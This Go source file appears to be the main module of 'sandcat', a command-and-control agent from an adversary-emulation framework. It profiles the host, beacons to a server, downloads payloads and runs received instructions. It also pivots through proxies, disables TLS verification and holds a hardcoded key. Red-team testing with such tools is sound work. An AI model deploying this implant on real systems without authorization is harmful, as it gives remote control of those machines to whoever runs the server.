package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"reflect"
	"runtime"
	"strconv"
	"sync"

	"./contact"
	"./execute"
	"./util"
)

func runAgent(coms contact.Contact, profile map[string]interface{}) {
	var msfmux sync.Mutex // mutex for metasploit commands

	for {
		beacon := coms.GetInstructions(profile)
		if beacon["sleep"] != nil {
			profile["sleep"] = beacon["sleep"]
		}
		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
			cmds := reflect.ValueOf(beacon["instructions"])
			for i := 0; i < cmds.Len(); i++ {
				cmd := cmds.Index(i).Elem().String()
				command := util.Unpack([]byte(cmd))
				payloads := coms.DropPayloads(command["payload"].(string), profile["server"].(string))
				fmt.Printf("[*] Running instruction %.0f\n", command["id"])
				go coms.RunInstruction(command, profile, payloads, &msfmux) // passes pointer to msf mutex for metasploit things
				util.Sleep(command["sleep"].(float64))
			}
		} else {
			util.Sleep(float64(profile["sleep"].(int)))
		}
	}
}

func buildProfile(server string, group string, sleep int, executors []string) map[string]interface{} {
	host, _ := os.Hostname()
	user, _ := user.Current()
	paw := fmt.Sprintf("%s$%s", host, user.Username)
	profile := make(map[string]interface{})
	profile["paw"] = paw
	profile["server"] = server
	profile["group"] = group
	profile["architecture"] = runtime.GOARCH
	profile["platform"] = runtime.GOOS
	profile["location"] = os.Args[0]
	profile["sleep"] = sleep
	profile["pid"] = strconv.Itoa(os.Getpid())
	profile["ppid"] = strconv.Itoa(os.Getppid())
	profile["executors"] = execute.DetermineExecutor(executors, runtime.GOOS, runtime.GOARCH)
	return profile
}

func chooseCommunicationChannel(profile map[string]interface{}) contact.Contact {
	coms, _ := contact.CommunicationChannels["API"]
	if coms.Ping(profile["server"].(string)) {
		go util.StartProxy(profile["server"].(string))
		return coms
	}
	proxy := util.FindProxy(util.ReadFile("masters.txt"))
	if len(proxy) == 0 {
		return nil
	}
	profile["server"] = proxy
	return coms
}

func main() {
	var executors execute.ExecutorFlags
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	server := flag.String("server", "http://localhost:8888", "The FQDN of the server")
	group := flag.String("group", "my_group", "Attach a group to this agent")
	sleep := flag.Int("sleep", 10, "Initial sleep value for sandcat (integer in seconds)")

	flag.Var(&executors, "executors", "Comma separated list of executors (first listed is primary)")
	flag.Parse()

	profile := buildProfile(*server, *group, *sleep, executors)
	for {
		coms := chooseCommunicationChannel(profile)
		if coms != nil {
			for {
				runAgent(coms, profile)
			}
		}
		util.Sleep(300)
	}
}

var key = "IFS9IZCOKQ5FGIP81ZYC4I2BOX4ZT6"